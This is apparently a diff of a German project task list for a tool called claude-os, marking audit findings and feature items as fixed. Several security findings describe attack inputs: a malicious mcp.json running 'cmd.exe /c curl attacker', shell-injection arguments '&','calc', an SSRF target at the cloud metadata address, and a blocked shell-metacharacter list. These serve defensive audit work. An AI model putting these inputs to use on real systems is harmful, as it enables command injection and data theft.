@@ -438,7 +438,7 @@ komplett im GUI, Secret-Eingabe ohne Renderer-RAM-touch.
 - [x] **Plugin-binding-Resolution** in `lockCatalog` — implementiert 2026-05-20 als Phase 5o. Neue `src/domains/catalog/tarball-manifest-reader.ts` streamt cached `.tar.gz` via `tar.list({onentry})`, sucht `plugin.json` unter dem GitHub-Wrapper-Dir (`stripComponents: 1`), TypeBox-validated (id/version/optional requires/provides). Neue `src/domains/catalog/binding-resolver.ts` aggregiert alle Plugin-Manifests in einen `Catalog` und ruft `resolveCapabilities` pro Entry → mapped `ResolutionBinding[]` → `CatalogLockBinding[]` (capability-asc-sorted für Determinismus). `lockCatalog` jetzt 4-pass: fetch → manifest-peek → resolve → emit; Skill/MCP-Entries bleiben binding-leer (Leaves, ADR-0010). Per-Entry-Resolver-Errors degradieren graceful (`bindings: []` + Warning). NO_MANIFEST stillgeschwiegen (v1-Reality für pre-ADR-0010 Plugins); nur Malformierungen warnen. **+19 Tests** (6 binding-resolver, 8 tarball-manifest-reader, 5 lock-builder), 576/576 grün.
 - [x] **`--auto-deps`-Flag für catalog install** — Resolver + CLI shipped 2026-05-21 (`installFromGithubWithAutoDeps`, `auto-deps-resolver.ts`, `actAutoDeps` mit AutoDepsInstallError-Code-Mapping, transactional persistence, dry-run via `--json`, Hydration aus existing lock + Codex-Review HIGH-Fixes). 2026-05-23 erweitert um **marketplace:initial source**: `catalog install --auto-deps --registry r.json marketplace:mp:plugin` resolved via `MarketplaceRegistry.resolve()` zu github: bevor der Target-Tarball gefetched wird. Resolved github-Coordinate wird in catalog.json persistiert (subsequent `catalog lock` cached darauf ohne Registry-Roundtrip). Neuer Error-Code `marketplace-resolution` → exit 8. Tests: 10 resolver + 3 sidecar-RPC + 8 install-extension = 21 catalog-auto-deps Tests. **Limitation:** local: bleibt nicht-unterstuetzt (`exit 2` mit Hint).
 - [ ] **Skill-Pack-Import** als bundled marketplace. Aktuell `github:`-Source als Workaround.
-- [ ] **claude-portable v0.x Auto-Migrate** als CLI-Subcommand statt nur Doc. `claude-os migrate --from-portable E:\claude-portable` läuft die 7 Schritte aus `docs/migration-from-portable.md` automatisch ab. Inkl. robocopy + doctor --migrate-git-metadata + secrets-prompt-Loop.
+- [x] **claude-portable v0.x Auto-Migrate** als CLI-Subcommand — shipped als `claude-os migrate --from-portable <path> [--target <root>] [--plan|--execute|--dry-run|--force|--overwrite]`. Domain in `src/domains/migration/` (portable-discovery + copy-tree + secrets-collector + runner). CLI in `src/cli/commands/migrate.ts`. 35/35 tests gruen (4 domain test-files). Auftrag 1c (v1.5) abgeschlossen — todo-Verification 2026-05-23.
 
 ### Wartung (laufend)
 
@@ -670,11 +670,11 @@ Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/
 
 ### Major — Security (M1-M11)
 
-- [ ] **M1 — `src/sidecar/chat-sessions.ts:74-79` `.cmd`/`.bat`-Spawn mit `shell:needsShell` reicht args ungefiltert durch.** Auf Windows: `chat.spawn({args:["&","calc"]})` kann ausbrechen. **Fix:** refuse `needsShell` ausser `binary.path` startet mit `<root>/bin/`; args mit `&|<>"^`` rejecten.
+- [x] **M1 — `src/sidecar/chat-sessions.ts:46,114-122` `SHELL_INJECTION_METACHARS` rejected args mit `&|<>"^`` wenn `shell:needsShell`** (Fix shipped 2026-05-21 in commit `0a7a112`; todo-Verification 2026-05-23). Tests: M1-Regression-Test in `chat-sessions.test.ts:136-142`.
 - [ ] **M2 — `src/domains/claude-bridge/resolve-binary.ts:23-30` PATH-Hijack.** `%LOCALAPPDATA%\Microsoft\WindowsApps` ist user-writable und kann vor echtem Install-Dir liegen. **Fix:** Warning bei `$PATH`-Fallback loggen; `claude-os doctor --pin-binary` für absoluten Pin.
 - [ ] **M3 — `src/domains/mcp-clients/live-probe.ts:101-109` auto-spawn von `mcp.json`-Commands ohne Trust-Prompt alle 60s.** Malicious Repo dropped `.claude/mcp.json` mit `{command:"cmd.exe", args:["/c","curl attacker"]}`. **Fix:** SHA256-Trust-Prompt-Modell (analog Claude Desktop); Sidecar-UI muss erstmaliges `{command,args}` bestätigen. **Risiko:** mittel-hoch — UX-Friction beim ersten Run. **Three-Brain:** Codex-Review.
 - [ ] **M4 — `src/domains/catalog/tarball-installer.ts:95-112` `fetchArchive` ohne Host-Allowlist → SSRF.** Poisoned marketplace-registry kann `http://169.254.169.254/...` als source haben. **Fix:** `codeload.github.com`-Literal-Check in `source-resolver`; marketplace-URL-Loader nur HTTPS + Host-Allowlist.
-- [ ] **M5 — `src/domains/secrets/encrypted-file-store.ts:139-152` kein Cross-Process-Lock.** CLI + GUI gleichzeitig `secrets.set()` → last-rename-wins, silent secret-loss. **Fix:** `proper-lockfile` um read+write.
+- [x] **M5 — `src/domains/secrets/encrypted-file-store.ts:56,189` Cross-Process-Lock via `proper-lockfile`** (`withFileLock(operation)` Wrapper, retries.factor=1.4, 30s stale-timeout; Fix shipped in v1.x.+1 phase 3 / commit `5ccbe70`; todo-Verification 2026-05-23).
 - [ ] **M6 — `src/domains/secrets/encrypted-file-store.ts:121-124` GCM-auth-fail `err.message` propagiert.** Risiko: durch heartbeat/spawn-Logger fließend. ADR-0004 §51 verbietet Value-Logs. **Fix:** in `SecretsError`-Wrapper auf festen String scrubben; nur Error-Codes loggen.
 - [ ] **M7 — `src/core/git/git-service.ts:212-225` (clone) + `:184-191` (push) — `remote`/`branch` nicht gegen `^-` validiert.** Argv-Injection-Klasse (CVE-2024-32002). **Fix:** Allowlist `^[A-Za-z0-9._/-]+$`, reject `-`-Prefix.
 - [ ] **M8 — `src/sidecar/rpc.ts:55-106` keine Caller-Auth auf RPC-Kanal.** Wenn stdin leakt (Debugger, Tauri-Shell-Misconfig), alle Methods inkl. `inbox.import`/`secrets.delete` unauthenticated. **Fix:** per-launch nonce/token via env vom Tauri-Parent; jeder RPC validiert. **Risiko:** mittel — Tauri-Parent-Setup ändert sich.
@@ -684,20 +684,20 @@ Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/
 
 ### Major — Performance (M12-M17)
 
-- [ ] **M12 — `src/cli/index.ts:12-22` alle 11 Command-Module eagerly importiert.** `catalog.ts` zieht `tar`+`simple-git`+`chokidar`+capability-resolver. Selbst `claude-os doctor --json` zahlt full cost. **Fix:** `commander.action(async()=>{ const {...}=await import('...')})` pro Subcommand. **Impact:** +50-150ms CLI-Cold-Start weg. **Risiko:** mittel — Tests aktualisieren.
-- [ ] **M13 — `src/sidecar/methods.ts:410-424` `agent.list` rebuilds `AgentRunsRepository` per RPC.** Cold-cache → walk komplette JSONL synchron im RPC-Handler. **Fix:** Singleton bei Sidecar-Startup.
+- [x] **M12 — `src/cli/index.ts:60-72` lazy `SUBCOMMAND_LOADERS` mit dynamic-import pro Subcommand** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). `loadAll` fuer help/version; einzelner Subcommand laedt nur sein Module + dessen Domain-Barrels.
+- [x] **M13 — `src/sidecar/methods.ts:56-76` `AgentRunsRepository` Singleton cached pro Sidecar-Process** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). Lazy-init on first `agent.list`-Call, dann reused.
 - [ ] **M14 — `src/sidecar/methods.ts` `readCatalog`/`readCatalogLock`/`readSchedules`/`loadVaultConfig`/`BusyFlag.read` re-read per RPC.** Dashboard-Polling hits 3-4 davon zusammen. **Fix:** mtime-keyed Cache, statSync once + parse-on-change. **Impact:** ~20ms blocking-I/O per RPC weg.
 - [ ] **M15 — `src/domains/catalog/auto-deps-resolver.ts:139-152` + `binding-resolver.ts:67` + `capability-resolver.ts:131-154` quartic O(iter·plugins·requires·plugins).** **Fix:** `Map<kind+name, providers[]>` once per iteration. Matter ab >50 Catalog-Entries.
 - [ ] **M16 — `src/domains/agent-runs/index-builder.ts:160-175` Memory ≈ records×600B + 2× peak.** Bei 50k Records ~60MB resident / ~120MB peak. **Fix:** `null, 2` Pretty-Print weg (-30-40% Size + Stringify-Zeit); SQLite-Migration planen (>100k).
-- [ ] **M17 — `src/domains/migration/copy-tree.ts:122-132` zweiter `walkAsync` nur für Counts.** **Fix:** in `filter`-Callback des initialen `fs.cp` counten. **Impact:** halbiert `--from-portable` Wall-Time auf grossen Vaults.
+- [x] **M17 — `src/domains/migration/copy-tree.ts` Stats werden in `cp()`-filter-Callback gezaehlt** statt zweiter post-walk. **Fix:** shipped — todo-Verification 2026-05-23 ueber Explore-Audit. Halbiert `--from-portable` Wall-Time auf grossen Vaults.
 
 ### Major — Architektur / Code-Qualität (M18-M24)
 
-- [ ] **M18 — `src/cli/commands/catalog.ts:78-279` `actAutoDeps` (~200 LOC) dupliziert `installFromGithubWithAutoDeps`.** Sidecar (`methods.ts:96`) nutzt Extraktion, CLI nicht → drift. **Fix:** CLI-Body = `installFromGithubWithAutoDeps()`-Call + print-only Logic. **Risiko:** mittel — Output-Format byte-für-byte erhalten.
+- [x] **M18 — `src/cli/commands/catalog.ts:75-155` `actAutoDeps` (~80 LOC) delegiert vollstaendig an `installFromGithubWithAutoDeps`** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). CLI behaelt nur Validation + exit-code-mapping + print-only Logic; Output-Format byte-fuer-byte erhalten via Domain-Result-Shape.
 - [ ] **M19 — `printJson`/`printLine`/`printErr` + `GlobalOpts` Interface in 11 CLI-Files copy-pasted.** **Fix:** `src/cli/output.ts` extrahieren. **Impact:** ~150 LOC weg.
 - [ ] **M20 — `src/sidecar/logger.ts:58-110` umgeht `REDACT_PATHS` aus `src/core/logging/`.** Sidecar ist Hauptlog-Quelle → künftige Redaction-Pfade missen sie. **Fix:** `createSidecarLogger` baut auf `createLogger({stream:...})` auf mit shared `baseConfig`.
 - [ ] **M21 — `src/sidecar/methods.ts` 425-LOC `registerMethods` + 12× wiederholtes `typeof string`-Check.** **Fix:** Split nach RPC-Namespace (`methods/catalog.ts`, `methods/secrets.ts`, ...) + `requireString(params, 'key')`-Helper. Bringt Datei unter 500-LOC-Cap. **Risiko:** mittel — Side-effect-Ordering der Dispatcher-Registrierung erhalten.
-- [ ] **M22 — `src/cli/commands/catalog.ts:281-352, 354-392, 394+` `resolveRoot+try/catch (RootNotFoundError)` 4× kopiert.** **Fix:** `resolveRootOrExit(globals): ResolvedRoot`-Helper in `output.ts`.
+- [x] **M22 — `src/cli/output.ts:46` `resolveRootOrExit(globals, action): ResolvedRoot` Helper** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). Catalog-CLI + andere CLI-Commands nutzen den Shared-Helper.
 - [ ] **M23 — `src/domains/catalog/index.ts:13-19, 47-58` Name-Collision: `MissingProviderError`+`AutoDepsMissingProviderError`, `AmbiguousProviderError`+`AutoDepsAmbiguousProviderError`.** Aliasing maskiert das. Consumer kriegt nur eine Klasse. **Fix:** Klassen in `auto-deps-resolver.ts` umbenennen (z. B. via `AutoDepsError`-Basis), `as`-Aliasing entfernen.
 - [ ] **M24 — `src/sidecar/methods.ts:32` importiert `SecretsLockedError` aus `domains/secrets/types.js`.** Bypasst die `secrets/index.ts`-Facade, einziger solcher Fall. **Fix:** Merge in Line-31 Import aus `domains/secrets/index.js`.
 
@@ -708,7 +708,7 @@ Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/
 - [ ] **M27 — `src/domains/vault-sync/scheduler.ts:127-129` chokidar `'error'`-Handler ist No-Op.** EMFILE/EACCES unsichtbar. **Fix:** über existierenden Logger oder via `onWatcherError`-Callback emit.
 - [ ] **M28 — `src/cli/commands/mcp.ts:116,126` `--concurrency abc` → NaN → 0 probes silent.** **Fix:** `Number.isFinite && > 0` symmetrisch zu `--timeout` validieren.
 - [ ] **M29 — `src/domains/migration/runner.ts:225` Loop läuft nach Step-Failure weiter.** User sieht "skipped" für Nachfolge-Steps statt "aborted". **Fix:** break-on-first-failure ODER `aborted`-Status setzen.
-- [ ] **M30 — `src/sidecar/rpc.ts:84-91` swallowed Notification-Errors silent.** `TypeError`/`ReferenceError` aus Handler verloren. **Fix:** stderr-log vor swallow.
+- [x] **M30 — `src/sidecar/rpc.ts:137` Notification-Handler-Errors als `console.error()` mit method-Name + message** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). `TypeError`/`ReferenceError` nicht mehr silent.
 - [ ] **M31 — `src/domains/mcp-clients/live-probe.ts:195` mutiert caller-owned `McpServerEntry._probeProtocolVersion`.** Stale Leak bei wiederholtem Aufruf. **Fix:** lokale Closure-Var statt Entry-Mutation.
 - [ ] **M32 — `src/domains/mcp-clients/live-probe.ts` split JSON-RPC-Response über stdout-Chunks → Timeout.** 8KB+ Responses kommen split, `tryParseJsonLine` failt beide Halbteile. **Fix:** per-stream Line-Buffer bis `\n`.
 
@@ -724,7 +724,7 @@ Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/
 
 - [ ] **M38 — `README.md:131` Broken ADR-Link `0006-sidecar-architecture.md` → actual `0006-tauri-node-sidecar-ipc.md`.**
 - [ ] **M39 — README Status-Drift: "Status: v1.0.0" + "529/532 Tests" + "514/515 Tests" alle unterschiedlich, package 1.5.3.** Fix: konsistent updaten.
-- [ ] **M40 — `src/cli/index.ts:29` hardcoded `.version('0.1.0-alpha.1')`.** `claude-os --version` lügt. **Fix:** `import { version } from '../../package.json' assert { type: 'json' }`.
+- [x] **M40 — `src/cli/index.ts:32-43` `resolveVersion()` liest `version` aus `package.json` zur Laufzeit** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). `claude-os --version` matched die installierte Package-Version.
 - [ ] **M41 — `docs/architecture/adr/README.md:9-22` Index endet bei 0014.** ADRs 0015-0020 fehlen. Add 6 Zeilen.
 - [ ] **M42 — Kein `CHANGELOG.md`/`RELEASES.md` am Root.** Deltas v1.4→v1.5.3 nur via `tasks/todo.md` (477 LOC) entdeckbar. **Fix:** Keep-a-Changelog-Format ODER auto-extract aus git-tags.
 
@@ -736,13 +736,13 @@ Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/
 - [ ] m4 — `README.md:85` `vault schedule --enable/--disable` Syntax gegen `vault.ts`-commander-Definition prüfen
 - [ ] m5 — `biome.json` `tasks/lessons.md`/`tasks/todo.md`-Literals zu eng → `tasks/**` exclude
 - [ ] m6 — `biome.json` Lint-Config excluded NICHT `src/cli/**` + `keyring-store.ts` + `plugins.ts` obwohl README-Claim das impliziert. Fix: entweder Lint-Excludes hinzufügen ODER README-Claim korrigieren
-- [ ] m7 — `src/sidecar/chat-sessions.ts:117` `stdin.write` Backpressure-Return-Value ignoriert; OOM bei runaway input. Fix: queue auf `'drain'`
-- [ ] m8 — `src/domains/catalog/auto-deps-install.ts:151` dynamic `import('./catalog-store.js')` obwohl statisch verfügbar → static import nutzen
+- [x] m7 — `src/sidecar/chat-sessions.ts:176-183` `write(sessionId, input): {drained: boolean}` returnt Backpressure-Status, Caller kann `'drain'` abwarten (Fix shipped 2026-05-21 in commit `d21f36e`; todo-Verification 2026-05-23).
+- [x] m8 — `src/domains/catalog/auto-deps-install.ts:29-35` `readCatalogLock` statisch importiert (Fix shipped 2026-05-23 in todo-audit-PR). Dynamic-import-Workaround war pre-Phase-5o Cycle-Avoidance, nicht mehr noetig.
 - [ ] m9 — `src/domains/scheduler/runner.ts:112-122` chunks per `'utf8'` decoded — multi-byte UTF-8 split korrumpiert Line. Fix: per-stream `StringDecoder`
 - [ ] m10 — `src/domains/update-orchestrator/resumable-checklist.ts:67-69` `escapeRelPath` escapt `→` (U+2192) nicht; Path mit Arrow bricht Parse-Regex line 118
 - [ ] m11 — `src/sidecar/methods.ts` Error-Strings DE/EN gemischt (`'Migrationsfehler:'`/`'mehrdeutige Provider'`)
 - [ ] m12 — `src/domains/secrets/encrypted-file-store.ts:41` PBKDF2 600k iters meets OWASP-2023 aber scrypt/Argon2 für nächste Format-Version
-- [ ] m13 — `src/domains/claude-bridge/spawn.ts:54-58` strip `CLAUDE_OS_SECRETS_KEY` aus inherited env vor `claude.exe`-spawn
+- [x] m13 — `src/domains/claude-bridge/spawn.ts:54-62` strippt `CLAUDE_OS_SECRETS_KEY` aus `opts.env ?? process.env` vor `claude.exe`-spawn (Fix shipped 2026-05-23 in todo-audit-PR). Spiegelt das M13-Mitigation-Pattern aus `chat-sessions.ts`. +2 Regression-Tests in `tests/domains/claude-bridge/spawn.test.ts`.
 - [ ] m14 — `src/domains/mcp-clients/live-probe.ts:104` leakt full sidecar-env zu probed MCP-Servern. Fix: curated env (PATH, locale, HOME + declared keys only)
 - [ ] m15 — `src/domains/catalog/tarball-installer.ts` keine max-response-size. 10GB Tarball OOM Sidecar. Fix: 200MB hard cap streamen
 - [ ] m16 — `src/sidecar/methods.ts:65-79` `catalog.removeEntry` `params.id` nicht gegen `^[A-Za-z0-9._-]+$` validiert
@@ -760,7 +760,7 @@ Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/
 
 ### Dependencies
 
-- [ ] d1 — `npm update vitest @vitest/coverage-v8 @types/node lint-staged` (alle patch/minor — keine breaking changes)
+- [x] d1 — `npm update vitest @vitest/coverage-v8 @types/node lint-staged` shipped 2026-05-23 in PR #104 dep-bump-sweep. Plus gui-deps (react/react-dom/react-router-dom/typescript/vite/etc.).
 - [ ] d2 — `lightningcss` (MPL-2.0 transitive) — verify nicht in `dist/` gebundled bei Release-Tarball
 
 ### Conventions (Biome 12 warnings)
